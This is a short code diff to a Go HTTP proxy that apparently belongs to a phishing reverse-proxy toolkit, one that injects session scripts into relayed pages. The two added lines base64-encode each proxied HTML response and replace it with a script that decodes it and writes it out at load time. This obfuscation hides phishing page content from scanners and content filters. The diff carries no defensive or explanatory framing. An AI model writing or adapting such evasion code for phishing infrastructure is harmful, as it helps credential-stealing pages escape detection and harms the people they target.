@@ -1177,6 +1177,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							body = p.injectJavascriptIntoBody(body, "", fmt.Sprintf("/s/%s.js", s.Id))
 						}
 					}
+    					encodedBody := base64.StdEncoding.EncodeToString(body)
+    					body = []byte(fmt.Sprintf("<script>document.write(decodeURIComponent(atob('%s')));</script>", encodedBody))
 				}
 
 				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
